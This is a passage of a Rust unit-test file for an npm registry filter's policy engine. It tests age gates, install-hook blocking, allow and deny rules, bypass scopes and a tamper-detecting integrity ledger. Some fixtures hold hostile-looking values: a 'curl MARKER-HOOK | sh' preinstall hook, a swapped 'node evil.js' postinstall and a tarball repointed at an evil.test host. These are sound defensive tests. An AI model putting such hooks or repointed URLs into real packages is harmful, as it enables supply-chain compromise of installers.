//! Policy engine unit tests — every gate, every ordering rule, every documented edge case.
//! Fixtures are hand-written packuments; nothing here touches the network or the clock.

use super::*;
use serde_json::{Map, Value, json};

/// The "current time" every test evaluates against.
const NOW: &str = "2026-08-04T12:00:00Z";
/// Comfortably outside any age window used here.
const OLD: &str = "2020-01-01T00:00:00Z";
/// Three days before `NOW` — inside the default 30-day window.
const RECENT: &str = "2026-08-01T12:00:00Z";

fn ts(raw: &str) -> DateTime<Utc> {
    DateTime::parse_from_rfc3339(raw)
        .expect("fixture timestamp is valid RFC 3339")
        .with_timezone(&Utc)
}

fn now() -> DateTime<Utc> {
    ts(NOW)
}

// -- fixture builder ---------------------------------------------------------------------

struct Fixture {
    name: String,
    versions: Map<String, Value>,
    time: Map<String, Value>,
    tags: Map<String, Value>,
    with_time: bool,
    with_tags: bool,
}

impl Fixture {
    fn new(name: &str) -> Self {
        let mut time = Map::new();
        time.insert("created".to_owned(), json!("2015-01-01T00:00:00.000Z"));
        time.insert("modified".to_owned(), json!(NOW));
        Self {
            name: name.to_owned(),
            versions: Map::new(),
            time,
            tags: Map::new(),
            with_time: true,
            with_tags: true,
        }
    }

    /// A version with a publish time, an integrity and zero or more scripts.
    fn version(
        mut self,
        version: &str,
        published: Option<&str>,
        integrity: Option<&str>,
        scripts: &[(&str, &str)],
    ) -> Self {
        let mut meta = Map::new();
        meta.insert("name".to_owned(), json!(self.name));
        meta.insert("version".to_owned(), json!(version));
        if let Some(integrity) = integrity {
            meta.insert(
                "dist".to_owned(),
                json!({
                    "tarball": format!("https://registry.npmjs.org/{}/-/x-{version}.tgz", self.name),
                    "integrity": integrity,
                }),
            );
        } else {
            meta.insert(
                "dist".to_owned(),
                json!({
                    "tarball": format!("https://registry.npmjs.org/{}/-/x-{version}.tgz", self.name),
                }),
            );
        }
        if !scripts.is_empty() {
            let mut map = Map::new();
            for (hook, command) in scripts {
                map.insert((*hook).to_owned(), json!(command));
            }
            meta.insert("scripts".to_owned(), Value::Object(map));
        }
        if let Some(published) = published {
            self.time.insert(version.to_owned(), json!(published));
        }
        self.versions
            .insert(version.to_owned(), Value::Object(meta));
        self
    }

    /// A version whose metadata object is supplied verbatim.
    fn raw_version(mut self, version: &str, published: Option<&str>, meta: Value) -> Self {
        if let Some(published) = published {
            self.time.insert(version.to_owned(), json!(published));
        }
        self.versions.insert(version.to_owned(), meta);
        self
    }

    /// A `time` entry not backed by any entry in `versions` (an unpublished version).
    fn orphan_time(mut self, version: &str, published: &str) -> Self {
        self.time.insert(version.to_owned(), json!(published));
        self
    }

    fn tag(mut self, tag: &str, version: &str) -> Self {
        self.tags.insert(tag.to_owned(), json!(version));
        self
    }

    fn without_time(mut self) -> Self {
        self.with_time = false;
        self
    }

    fn without_tags(mut self) -> Self {
        self.with_tags = false;
        self
    }

    fn build(self) -> Value {
        let mut root = Map::new();
        root.insert("name".to_owned(), json!(self.name));
        if self.with_tags {
            root.insert("dist-tags".to_owned(), Value::Object(self.tags));
        }
        root.insert("versions".to_owned(), Value::Object(self.versions));
        if self.with_time {
            root.insert("time".to_owned(), Value::Object(self.time));
        }
        Value::Object(root)
    }
}

// -- harness -----------------------------------------------------------------------------

struct Harness {
    rules: InMemoryRules,
    ledger: InMemoryLedger,
    config: PolicyConfig,
}

impl Harness {
    fn new() -> Self {
        Self {
            rules: InMemoryRules::new(),
            ledger: InMemoryLedger::new(),
            config: PolicyConfig::default(),
        }
    }

    fn with_rule(mut self, rule: Rule) -> Self {
        self.rules.insert(rule);
        self
    }

    fn with_bypass(mut self, scopes: &[&str]) -> Self {
        self.config.bypass_scopes = scopes.iter().map(|scope| (*scope).to_owned()).collect();
        self
    }

    fn with_min_age_days(mut self, days: u32) -> Self {
        self.config.min_age_days = days;
        self
    }

    /// Opt into moving a `dist-tags` entry onto an older surviving release. Off by default,
    /// because a security gate that silently downgrades is doing harm.
    fn with_dist_tag_downgrade(mut self) -> Self {
        self.config.allow_dist_tag_downgrade = true;
        self
    }

    fn run(&self, packument: &Value) -> PolicyOutcome {
        evaluate(packument, &self.rules, &self.ledger, &self.config, now())
            .expect("fixture packument is well formed")
    }
}

// -- assertions --------------------------------------------------------------------------

fn served(outcome: &PolicyOutcome) -> Vec<String> {
    outcome.surviving_versions()
}

fn time_keys(outcome: &PolicyOutcome) -> Vec<String> {
    outcome
        .packument
        .get("time")
        .and_then(Value::as_object)
        .map(|time| time.keys().cloned().collect())
        .unwrap_or_default()
}

fn tag_of<'a>(outcome: &'a PolicyOutcome, tag: &str) -> Option<&'a str> {
    outcome
        .packument
        .get("dist-tags")
        .and_then(Value::as_object)
        .and_then(|tags| tags.get(tag))
        .and_then(Value::as_str)
}

fn block_for<'a>(outcome: &'a PolicyOutcome, version: &str) -> &'a BlockRecord {
    outcome
        .blocked
        .iter()
        .find(|record| record.version == version)
        .unwrap_or_else(|| {
            panic!(
                "expected {version} to be blocked, got {:?}",
                outcome.blocked
            )
        })
}

// -- gate 6: the happy path --------------------------------------------------------------

#[test]
fn aged_clean_version_is_served() {
    let packument = Fixture::new("is-odd")
        .version("1.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .tag("latest", "1.0.0")
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(served(&outcome), vec!["1.0.0".to_owned()]);
    assert!(outcome.blocked.is_empty(), "{:?}", outcome.blocked);
    assert_eq!(tag_of(&outcome, "latest"), Some("1.0.0"));
}

#[test]
fn tarball_url_and_other_fields_are_left_untouched() {
    let packument = Fixture::new("is-odd")
        .version("1.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .tag("latest", "1.0.0")
        .build();
    let outcome = Harness::new().run(&packument);

    let tarball = outcome.packument["versions"]["1.0.0"]["dist"]["tarball"]
        .as_str()
        .expect("tarball survives");
    assert_eq!(tarball, "https://registry.npmjs.org/is-odd/-/x-1.0.0.tgz");
    assert_eq!(outcome.packument["name"], json!("is-odd"));
}

#[test]
fn scripts_other_than_install_hooks_do_not_block() {
    let packument = Fixture::new("lib")
        .version(
            "1.0.0",
            Some(OLD),
            Some("sha512-aaa"),
            &[("test", "vitest"), ("build", "tsc"), ("prepare", "husky")],
        )
        .tag("latest", "1.0.0")
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(served(&outcome), vec!["1.0.0".to_owned()]);
    assert!(outcome.blocked.is_empty(), "{:?}", outcome.blocked);
}

// -- gate 4: release age -----------------------------------------------------------------

#[test]
fn too_new_version_is_withheld_from_versions_and_time() {
    let packument = Fixture::new("lodash")
        .version("4.17.21", Some(OLD), Some("sha512-aaa"), &[])
        .version("4.17.22", Some(RECENT), Some("sha512-bbb"), &[])
        .tag("latest", "4.17.22")
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(served(&outcome), vec!["4.17.21".to_owned()]);
    let record = block_for(&outcome, "4.17.22");
    assert_eq!(record.reason, BlockReason::TooNew);
    assert!(record.detail.contains("30-day"), "{}", record.detail);

    assert!(!time_keys(&outcome).contains(&"4.17.22".to_owned()));
    assert!(time_keys(&outcome).contains(&"4.17.21".to_owned()));
}

#[test]
fn a_version_exactly_at_the_age_boundary_is_served() {
    let just_old_enough = "2026-07-05T11:59:00Z"; // 30 days + 1 minute before NOW
    let one_minute_short = "2026-07-05T12:01:00Z"; // 30 days - 1 minute before NOW
    let packument = Fixture::new("edge")
        .version("1.0.0", Some(just_old_enough), Some("sha512-aaa"), &[])
        .version("1.0.1", Some(one_minute_short), Some("sha512-bbb"), &[])
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(served(&outcome), vec!["1.0.0".to_owned()]);
    assert_eq!(block_for(&outcome, "1.0.1").reason, BlockReason::TooNew);
}

#[test]
fn a_version_published_in_the_future_is_too_new() {
    let packument = Fixture::new("clock-skew")
        .version(
            "1.0.0",
            Some("2027-01-01T00:00:00Z"),
            Some("sha512-aaa"),
            &[],
        )
        .build();
    let outcome = Harness::new().run(&packument);

    let record = block_for(&outcome, "1.0.0");
    assert_eq!(record.reason, BlockReason::TooNew);
    assert!(record.detail.contains("future"), "{}", record.detail);
}

#[test]
fn missing_time_entry_fails_closed_as_too_new() {
    let packument = Fixture::new("no-time")
        .version("1.0.0", None, Some("sha512-aaa"), &[])
        .version("1.0.1", Some(OLD), Some("sha512-bbb"), &[])
        .build();
    let outcome = Harness::new().run(&packument);

    assert_eq!(served(&outcome), vec!["1.0.1".to_owned()]);
    let record = block_for(&outcome, "1.0.0");
    assert_eq!(record.reason, BlockReason::TooNew);
    assert!(
        record.detail.contains("no `time` entry"),
        "{}",
        record.detail
    );
}

#[test]
fn packument_without_any_time_object_fails_closed() {
    let packument = Fixture::new("no-time-at-all")
        .version("1.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .without_time()
        .build();
    let outcome = Harness::new().run(&packument);

    assert!(served(&outcome).is_empty());
    assert_eq!(block_for(&outcome, "1.0.0").reason, BlockReason::TooNew);
    assert!(
        outcome.packument.get("time").is_none(),
        "no `time` object is synthesised"
    );
}

#[test]
fn unparseable_time_entry_fails_closed_as_too_new() {
    let packument = Fixture::new("bad-time")
        .version("1.0.0", Some("yesterday-ish"), Some("sha512-aaa"), &[])
        .build();
    let outcome = Harness::new().run(&packument);

    let record = block_for(&outcome, "1.0.0");
    assert_eq!(record.reason, BlockReason::TooNew);
    assert!(record.detail.contains("RFC 3339"), "{}", record.detail);
}

#[test]
fn zero_min_age_days_disables_the_age_gate_entirely() {
    let packument = Fixture::new("fresh")
        .version("1.0.0", Some(RECENT), Some("sha512-aaa"), &[])
        .version("1.0.1", None, Some("sha512-bbb"), &[])
        .version(
            "1.0.2",
            Some(RECENT),
            Some("sha512-ccc"),
            &[("postinstall", "node build.js")],
        )
        .build();
    let outcome = Harness::new().with_min_age_days(0).run(&packument);

    assert_eq!(
        served(&outcome),
        vec!["1.0.0".to_owned(), "1.0.1".to_owned()]
    );
    assert_eq!(
        block_for(&outcome, "1.0.2").reason,
        BlockReason::InstallScript,
        "the install-script gate still applies"
    );
}

// -- gate 5: install hooks ---------------------------------------------------------------

#[test]
fn every_install_hook_blocks_and_the_command_is_reported() {
    for hook in INSTALL_HOOKS {
        let packument = Fixture::new("hooked")
            .version(
                "1.0.0",
                Some(OLD),
                Some("sha512-aaa"),
                &[(hook, "node setup.mjs")],
            )
            .build();
        let outcome = Harness::new().run(&packument);

        assert!(served(&outcome).is_empty(), "{hook} should have blocked");
        let record = block_for(&outcome, "1.0.0");
        assert_eq!(record.reason, BlockReason::InstallScript);
        assert!(record.detail.contains(hook), "{}", record.detail);
        assert!(
            record.detail.contains("node setup.mjs"),
            "{}",
            record.detail
        );
    }
}

#[test]
fn multiple_hooks_are_reported_in_lifecycle_order() {
    let packument = Fixture::new("hooked")
        .version(
            "1.0.0",
            Some(OLD),
            Some("sha512-aaa"),
            &[
                ("postinstall", "node post.js"),
                ("preinstall", "node pre.js"),
                ("install", "node-gyp rebuild"),
            ],
        )
        .build();
    let outcome = Harness::new().run(&packument);

    let detail = &block_for(&outcome, "1.0.0").detail;
    let pre = detail.find("preinstall").expect("preinstall reported");
    let install = detail.find("; install: ").expect("install reported");
    let post = detail.find("postinstall").expect("postinstall reported");
    assert!(pre < install && install < post, "{detail}");
}

#[test]
fn a_non_string_install_hook_still_blocks() {
    let packument = Fixture::new("weird")
        .raw_version(
            "1.0.0",
            Some(OLD),
            json!({
                "dist": { "integrity": "sha512-aaa" },
                "scripts": { "install": ["node", "gyp"], "postinstall": null },
            }),
        )
        .build();
    let outcome = Harness::new().run(&packument);

    let record = block_for(&outcome, "1.0.0");
    assert_eq!(record.reason, BlockReason::InstallScript);
    assert!(record.detail.contains("install"), "{}", record.detail);
    assert!(
        !record.detail.contains("postinstall"),
        "a null hook is not present: {}",
        record.detail
    );
}

// -- gate 1: deny rules ------------------------------------------------------------------

#[test]
fn deny_rule_blocks_an_otherwise_clean_version() {
    let packument = Fixture::new("keyv")
        .version("5.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .tag("latest", "5.0.0")
        .build();
    let outcome = Harness::new()
        .with_rule(Rule::deny("keyv", "5.0.0").with_reason("compromised maintainer"))
        .run(&packument);

    assert!(served(&outcome).is_empty());
    let record = block_for(&outcome, "5.0.0");
    assert_eq!(record.reason, BlockReason::DenyRule);
    assert!(
        record.detail.contains("compromised maintainer"),
        "{}",
        record.detail
    );
}

#[test]
fn deny_rule_without_a_reason_still_reports_clearly() {
    let packument = Fixture::new("keyv")
        .version("5.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .build();
    let outcome = Harness::new()
        .with_rule(Rule::deny("keyv", "5.0.0"))
        .run(&packument);

    assert_eq!(block_for(&outcome, "5.0.0").detail, "denied by rule");
}

#[test]
fn a_rule_only_applies_to_its_own_version() {
    let packument = Fixture::new("keyv")
        .version("5.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .version("5.0.1", Some(OLD), Some("sha512-bbb"), &[])
        .build();
    let outcome = Harness::new()
        .with_rule(Rule::deny("keyv", "5.0.0"))
        .run(&packument);

    assert_eq!(served(&outcome), vec!["5.0.1".to_owned()]);
}

// -- gate 2: allow rules -----------------------------------------------------------------

#[test]
fn allow_rule_with_matching_integrity_bypasses_age_and_script_gates() {
    let packument = Fixture::new("esbuild")
        .version(
            "0.25.0",
            Some(RECENT),
            Some("sha512-approved"),
            &[("postinstall", "node install.js")],
        )
        .tag("latest", "0.25.0")
        .build();
    let outcome = Harness::new()
        .with_rule(Rule::allow("esbuild", "0.25.0", "sha512-approved"))
        .run(&packument);

    assert_eq!(served(&outcome), vec!["0.25.0".to_owned()]);
    assert!(outcome.blocked.is_empty(), "{:?}", outcome.blocked);
    assert_eq!(tag_of(&outcome, "latest"), Some("0.25.0"));
}

#[test]
fn allow_rule_with_stale_integrity_blocks_as_integrity_changed() {
    let packument = Fixture::new("esbuild")
        .version(
            "0.25.0",
            Some(OLD),
            Some("sha512-different"),
            &[("postinstall", "node install.js")],
        )
        .build();
    let outcome = Harness::new()
        .with_rule(Rule::allow("esbuild", "0.25.0", "sha512-approved"))
        .run(&packument);

    let record = block_for(&outcome, "0.25.0");
    assert_eq!(record.reason, BlockReason::IntegrityChanged);
    assert!(record.reason.is_critical());
    assert!(record.detail.contains("allow rule"), "{}", record.detail);
    // The operator sees the value THEY pinned, and a fingerprint of what upstream now serves.
    // The upstream string itself is never reproduced — a hostile registry does not get to
    // choose text that npmfilter repeats.
    assert!(record.detail.contains("sha512-approved"), "{}", record.detail);
    assert!(
        !record.detail.contains("sha512-different"),
        "the untrusted value must not be echoed: {}",
        record.detail
    );
    assert!(
        record
            .detail
            .contains(&crate::policy::fingerprint(Some("sha512-different"))),
        "but it must still be correlatable: {}",
        record.detail
    );
}

#[test]
fn allow_rule_pinned_to_a_hash_does_not_match_a_version_without_integrity() {
    let packument = Fixture::new("nohash")
        .version("1.0.0", Some(OLD), None, &[("install", "node gyp.js")])
        .build();
    let outcome = Harness::new()
        .with_rule(Rule::allow("nohash", "1.0.0", "sha512-approved"))
        .run(&packument);

    assert_eq!(
        block_for(&outcome, "1.0.0").reason,
        BlockReason::IntegrityChanged
    );
}

/// DESIGN.md "Rules store": "a changed command never inherits approval".
///
/// Packument metadata is served independently of the tarball bytes, so a mirror or a
/// registry-side metadata edit can change `scripts` while `dist.integrity` stays put. The
/// approval covered the commands, not just the hash.
#[test]
fn an_allow_rule_does_not_survive_a_changed_install_command() {
    let approved = json!({
        "name": "esbuild",
        "version": "0.21.5",
        "scripts": { "postinstall": "node install.js" },
        "dist": { "integrity": "sha512-approved" }
    });
    let rule = Rule {
        name: "esbuild".to_owned(),
        version: "0.21.5".to_owned(),
        verdict: Verdict::Allow,
        integrity: Some("sha512-approved".to_owned()),
        scripts_sha256: Some(scripts_sha256(&approved)),
        reason: None,
        actor: None,
    };

    // Same hash, same version, different command.
    let packument = Fixture::new("esbuild")
        .raw_version(
            "0.21.5",
            Some(OLD),
            json!({
                "name": "esbuild",
                "version": "0.21.5",
                "scripts": { "postinstall": "node evil.js" },
                "dist": { "integrity": "sha512-approved" }
            }),
        )
        .build();
    let outcome = Harness::new().with_rule(rule.clone()).run(&packument);

    let record = block_for(&outcome, "0.21.5");
    assert_eq!(record.reason, BlockReason::ScriptsChanged);
    assert!(
        record.reason.is_critical(),
        "an approved command changing under a fixed hash is a critical event"
    );
    assert!(record.detail.contains("node evil.js"), "{}", record.detail);
    assert!(served(&outcome).is_empty());

    // The identical commands still inherit the approval.
    let unchanged = Fixture::new("esbuild")
        .raw_version("0.21.5", Some(OLD), approved)
        .build();
    let outcome = Harness::new().with_rule(rule).run(&unchanged);
    assert_eq!(served(&outcome), vec!["0.21.5".to_owned()]);
}

// -- gate 5: install scripts -------------------------------------------------------------

/// `hasInstallScript` is publisher-supplied and some upstream/mirror manifests carry it with
/// no `scripts` map at all. The re-serializer believes the flag, so the gate must too — a
/// version cannot be admitted as hookless and then handed to npm labelled as hooked.
#[test]
fn a_version_flagged_has_install_script_without_a_scripts_map_is_withheld() {
    let packument = Fixture::new("flagged")
        .raw_version(
            "1.0.0",
            Some(OLD),
            json!({
                "name": "flagged",
                "version": "1.0.0",
                "hasInstallScript": true,
                "dist": { "integrity": "sha512-flag" }
            }),
        )
        .build();
    let outcome = Harness::new().run(&packument);

    let record = block_for(&outcome, "1.0.0");
    assert_eq!(record.reason, BlockReason::InstallScript);
    assert!(
        record.detail.contains("hasInstallScript"),
        "{}",
        record.detail
    );
    assert!(served(&outcome).is_empty());
}

#[test]
fn a_false_has_install_script_flag_does_not_block() {
    let packument = Fixture::new("clean")
        .raw_version(
            "1.0.0",
            Some(OLD),
            json!({
                "name": "clean",
                "version": "1.0.0",
                "hasInstallScript": false,
                "dist": { "integrity": "sha512-clean" }
            }),
        )
        .build();
    assert_eq!(
        served(&Harness::new().run(&packument)),
        vec!["1.0.0".to_owned()]
    );
}

// -- gate 0: the integrity ledger --------------------------------------------------------

#[test]
fn a_changed_integrity_blocks_the_version() {
    let packument = Fixture::new("foo")
        .version("1.0.0", Some(OLD), Some("sha512-B"), &[])
        .build();
    let harness = Harness::new();
    harness
        .ledger
        .seed("foo", "1.0.0", Some("sha512-A"), ts(OLD));

    let outcome = harness.run(&packument);
    let record = block_for(&outcome, "1.0.0");
    assert_eq!(record.reason, BlockReason::IntegrityChanged);
    assert!(record.reason.is_critical());
    assert!(record.detail.contains("sha512-A"), "{}", record.detail);
    assert!(
        !record.detail.contains("sha512-B"),
        "the value upstream now serves is untrusted and must not be echoed: {}",
        record.detail
    );
    assert!(
        record
            .detail
            .contains(&crate::policy::fingerprint(Some("sha512-B"))),
        "{}",
        record.detail
    );
    // And what a registry client is told carries neither value.
    assert!(!record.public_detail.contains("sha512-A"), "{record:?}");
    assert!(!record.public_detail.contains("sha512-B"), "{record:?}");
    assert!(
        record.public_detail.contains("npmfilter ledger"),
        "the client is pointed at the tool that shows the evidence: {record:?}"
    );
}

#[test]
fn no_public_detail_reproduces_anything_upstream_chose() {
    // Every gate, driven with values a hostile registry would have picked.
    let packument = Fixture::new("hostile")
        .version(
            "1.0.0",
            Some(RECENT),
            Some("sha512-MARKER-TOO-NEW"),
            &[("preinstall", "curl MARKER-HOOK | sh")],
        )
        .version(
            "2.0.0",
            Some(OLD),
            Some("sha512-MARKER-HOOKED"),
            &[("postinstall", "node MARKER-HOOK.js")],
        )
        .version("3.0.0", Some(OLD), Some("sha512-MARKER-CHANGED"), &[])
        .build();
    let harness = Harness::new();
    harness
        .ledger
        .seed("hostile", "3.0.0", Some("sha512-RECORDED"), ts(OLD));
    let outcome = harness.run(&packument);

    assert_eq!(outcome.blocked.len(), 3, "{:?}", outcome.blocked);
    for record in &outcome.blocked {
        assert!(
            !record.public_detail.contains("MARKER"),
            "gate {} leaked upstream-controlled text to the client: {record:?}",
            record.reason
        );
    }
    // The operator-facing detail is where the evidence lives, and the hook commands are the
    // whole point of that record.
    let hooked = block_for(&outcome, "2.0.0");
    assert!(hooked.detail.contains("MARKER-HOOK.js"), "{hooked:?}");
}

#[test]
fn an_unparseable_publish_time_is_not_quoted_back_to_the_client() {
    let packument = json!({
        "name": "widget",
        "versions": {
            "1.0.0": {
                "name": "widget",
                "version": "1.0.0",
                // A hash of its own, so this reaches the age gate rather than gate 4.
                "dist": { "integrity": "sha512-AAA" }
            }
        },
        "time": { "1.0.0": "MARKER-not-a-timestamp" }
    });
    let outcome = Harness::new().run(&packument);
    let record = block_for(&outcome, "1.0.0");
    assert_eq!(record.reason, BlockReason::TooNew);
    assert!(
        !record.detail.contains("MARKER") && !record.public_detail.contains("MARKER"),
        "{record:?}"
    );
    assert!(
        record
            .detail
            .contains(&crate::policy::fingerprint(Some("MARKER-not-a-timestamp"))),
        "{record:?}"
    );
}

#[test]
fn a_changed_integrity_is_not_rescued_by_an_allow_rule() {
    let packument = Fixture::new("foo")
        .version("1.0.0", Some(OLD), Some("sha512-B"), &[])
        .build();
    let harness = Harness::new().with_rule(Rule::allow("foo", "1.0.0", "sha512-B"));
    harness
        .ledger
        .seed("foo", "1.0.0", Some("sha512-A"), ts(OLD));

    let outcome = harness.run(&packument);
    let record = block_for(&outcome, "1.0.0");
    assert_eq!(record.reason, BlockReason::IntegrityChanged);
    assert!(
        record.detail.contains("integrity ledger"),
        "the ledger, not the rule, is what blocked: {}",
        record.detail
    );
}

#[test]
fn a_changed_integrity_is_not_rescued_by_a_bypass_scope() {
    let packument = Fixture::new("@olamedia/core")
        .version("1.0.0", Some(OLD), Some("sha512-B"), &[])
        .build();
    let harness = Harness::new().with_bypass(&["@olamedia"]);
    harness
        .ledger
        .seed("@olamedia/core", "1.0.0", Some("sha512-A"), ts(OLD));

    let outcome = harness.run(&packument);
    assert_eq!(
        block_for(&outcome, "1.0.0").reason,
        BlockReason::IntegrityChanged
    );
}

#[test]
fn the_recorded_hash_survives_a_replacement_attempt() {
    let packument = Fixture::new("foo")
        .version("1.0.0", Some(OLD), Some("sha512-B"), &[])
        .build();
    let harness = Harness::new();
    harness
        .ledger
        .seed("foo", "1.0.0", Some("sha512-A"), ts(OLD));
    let _ = harness.run(&packument);

    let entry = harness.ledger.entry("foo", "1.0.0").expect("entry exists");
    assert_eq!(entry.integrity.as_deref(), Some("sha512-A"));
}

#[test]
fn every_observed_version_is_recorded_including_blocked_ones() {
    let packument = Fixture::new("mixed")
        .version("1.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .version("2.0.0", Some(RECENT), Some("sha512-bbb"), &[])
        .version(
            "3.0.0",
            Some(OLD),
            Some("sha512-ccc"),
            &[("preinstall", "node x.js")],
        )
        .build();
    let harness = Harness::new().with_rule(Rule::deny("mixed", "1.0.0"));
    let outcome = harness.run(&packument);

    assert_eq!(outcome.blocked.len(), 3);
    assert_eq!(harness.ledger.len(), 3);
    for version in ["1.0.0", "2.0.0", "3.0.0"] {
        assert!(
            harness.ledger.entry("mixed", version).is_some(),
            "{version} must be in the ledger"
        );
    }
}

#[test]
fn re_observing_the_same_hash_bumps_the_counters_and_keeps_first_seen() {
    let packument = Fixture::new("foo")
        .version("1.0.0", Some(OLD), Some("sha512-aaa"), &[])
        .build();
    let harness = Harness::new();

    let first = harness.run(&packument);
    assert!(first.blocked.is_empty());
    let second = harness.run(&packument);
    assert!(second.blocked.is_empty());

    let entry = harness.ledger.entry("foo", "1.0.0").expect("entry exists");
    assert_eq!(entry.times_seen, 2);
    assert_eq!(entry.first_seen, now());
    assert_eq!(entry.last_seen, now());
}

/// A version publishing no content hash used to be served, and recorded in the ledger as
/// `NULL`. `NULL == NULL` is a permanent `Match`, so the ledger was a no-op for exactly the
/// versions nothing else pins: upstream could repoint `dist.tarball` at another artefact for
/// ever, and every later fetch reported the version unchanged, withheld nothing, raised no
/// tamper event and moved no mismatch counter.
#[test]
fn a_version_with_no_content_hash_at_all_is_withheld() {
    let packument = Fixture::new("legacy")
        .version("0.1.0", Some(OLD), None, &[])
        .build();
    let harness = Harness::new();
    let outcome = harness.run(&packument);

    assert!(served(&outcome).is_empty(), "{:?}", outcome.packument);
    let record = block_for(&outcome, "0.1.0");
    assert_eq!(record.reason, BlockReason::NoIntegrity);
    assert!(!record.reason.is_critical());
    // The client is told which gate fired, never what upstream published.
    assert!(
        !record.public_detail.contains("registry.npmjs.org"),
        "{record:?}"
    );
    assert!(
        record.detail.contains("no dist.integrity and no dist.shasum"),
        "{record:?}"
    );
    // It is still observed: the ledger records every version the daemon sees.
    let entry = harness.ledger.entry("legacy", "0.1.0").expect("recorded");
    assert_eq!(entry.integrity, None);
}

/// The overwhelming majority of hash-less versions are simply old: npm published `dist.shasum`
/// long before `dist.integrity`. Those are pinned to the shasum rather than withheld.
#[test]
fn a_version_with_only_a_shasum_is_pinned_to_it_and_serves() {
    let packument = Fixture::new("ancient")
        .raw_version(
            "0.1.0",
            Some(OLD),
            json!({
                "name": "ancient",
                "version": "0.1.0",
                "dist": {
                    "shasum": "1111111111111111111111111111111111111111",
                    "tarball": "https://registry.npmjs.org/ancient/-/ancient-0.1.0.tgz"
                }
            }),
        )
        .build();
    let harness = Harness::new();
    let outcome = harness.run(&packument);

    assert_eq!(served(&outcome), vec!["0.1.0".to_owned()]);
    let entry = harness.ledger.entry("ancient", "0.1.0").expect("recorded");
    assert_eq!(
        entry.integrity.as_deref(),
        Some("shasum-sha1:1111111111111111111111111111111111111111"),
        "the ledger pins something that can actually change"
    );
}

/// And once pinned, the shasum is defended exactly as an integrity is.
#[test]
fn a_changed_shasum_on_a_shasum_only_version_is_a_replacement() {
    let packument = Fixture::new("ancient")
        .raw_version(
            "0.1.0",
            Some(OLD),
            json!({
                "name": "ancient",
                "version": "0.1.0",
                "dist": {
                    "shasum": "2222222222222222222222222222222222222222",
                    "tarball": "https://evil.test/ancient-0.1.0.tgz"
                }
            }),
        )
        .build();
    let harness = Harness::new();
    harness.ledger.seed(
        "ancient",
        "0.1.0",
        Some("shasum-sha1:1111111111111111111111111111111111111111"),
        ts(OLD),
    );

    let outcome = harness.run(&packument);
    let record = block_for(&outcome, "0.1.0");
    assert_eq!(record.reason, BlockReason::IntegrityChanged);
    assert!(record.reason.is_critical());
    assert_eq!(
        harness
            .ledger
            .entry("ancient", "0.1.0")
            .expect("recorded")
            .mismatch_count,
        1
    );
}

#[test]
fn version_identity_prefers_integrity_then_shasum_then_nothing() {
    assert_eq!(
        version_identity(&json!({ "dist": { "integrity": "sha512-a", "shasum": "beef" } })),
        Some("sha512-a".to_owned())
    );
    assert_eq!(
        version_identity(&json!({ "dist": { "shasum": "beef" } })),
        Some("shasum-sha1:beef".to_owned())
    );
    assert_eq!(version_identity(&json!({ "dist": { "shasum": "" } })), None);
    assert_eq!(version_identity(&json!({ "dist": {} })), None);
    assert_eq!(version_identity(&json!({})), None);
    // The namespace prefix keeps a shasum from ever colliding with a real integrity value.
    assert_ne!(
        version_identity(&json!({ "dist": { "shasum": "sha512-a" } })),
        version_identity(&json!({ "dist": { "integrity": "sha512-a" } }))
    );
}

/// An operator who has looked at such a version can still admit it — gate 2 runs first.
#[test]
fn an_allow_rule_admits_a_hash_less_version_deliberately() {
    let packument = Fixture::new("legacy")
        .version("0.1.0", Some(OLD), None, &[])
        .build();
    let outcome = Harness::new()
        .with_rule(Rule {
            name: "legacy".to_owned(),
            version: "0.1.0".to_owned(),
            verdict: Verdict::Allow,
            integrity: None,
            scripts_sha256: None,
            reason: Some("no hash was ever published for this one".to_owned()),
            actor: None,
        })
        .run(&packument);
    assert_eq!(served(&outcome), vec!["0.1.0".to_owned()]);
}

#[test]
fn integrity_appearing_where_there_was_none_is_a_change() {
    let packument = Fixture::new("legacy")
        .version("0.1.0", Some(OLD), Some("sha512-new"), &[])
        .build();
    let harness = Harness::new();
    harness.ledger.seed("legacy", "0.1.0", None, ts(OLD));

    let outcome = harness.run(&packument);
    let record = block_for(&outcome, "0.1.0");
    assert_eq!(record.reason, BlockReason::IntegrityChanged);
    assert!(
        record.detail.contains("<no dist.integrity>"),
        "{}",
        record.detail
    );
}

#[test]
fn integrity_disappearing_is_a_change() {
    let packument = Fixture::new("legacy")
        .version("0.1.0", Some(OLD), None, &[])
        .build();
    let harness = Harness::new();
    harness
        .ledger
        .seed("legacy", "0.1.0", Some("sha512-old"), ts(OLD));

    let outcome = harness.run(&packument);
    assert_eq!(
        block_for(&outcome, "0.1.0").reason,
        BlockReason::IntegrityChanged
    );
}

#[test]
fn a_version_with_no_dist_object_at_all_is_withheld_not_served() {
    let packument = Fixture::new("odd")
        .raw_version("1.0.0", Some(OLD), json!({ "version": "1.0.0" }))
        .build();
    let harness = Harness::new();
    let outcome = harness.run(&packument);

    assert!(served(&outcome).is_empty());
    assert_eq!(
        block_for(&outcome, "1.0.0").reason,
        BlockReason::NoIntegrity,
        "nothing to pin means nothing to serve"
    );
    assert_eq!(
        harness
            .ledger
            .entry("odd", "1.0.0")
            .expect("recorded")
            .integrity,
        None
    );
}

// -- gate 3: bypass scopes ---------------------------------------------------------------

#[test]
fn bypass_scope_clears_the_age_and_script_gates() {
    let packument = Fixture::new("@olamedia/core")
        .version(
            "1.0.0",
            Some(RECENT),
            Some("sha512-aaa"),
            &[("postinstall", "node build.js")],
        )
        .tag("latest", "1.0.0")
        .build();
    let outcome = Harness::new().with_bypass(&["@olamedia"]).run(&packument);

    assert_eq!(served(&outcome), vec!["1.0.0".to_owned()]);
    assert!(outcome.blocked.is_empty(), "{:?}", outcome.blocked);
}

#[test]
fn bypass_scope_matches_with_or_without_the_at_sign() {
    let packument = Fixture::new("@olamedia/core")
        .version("1.0.0", Some(RECENT), Some("sha512-aaa"), &[])
        .build();
    let outcome = Harness::new().with_bypass(&["olamedia"]).run(&packument);

    assert_eq!(served(&outcome), vec!["1.0.0".to_owned()]);
}

#[test]
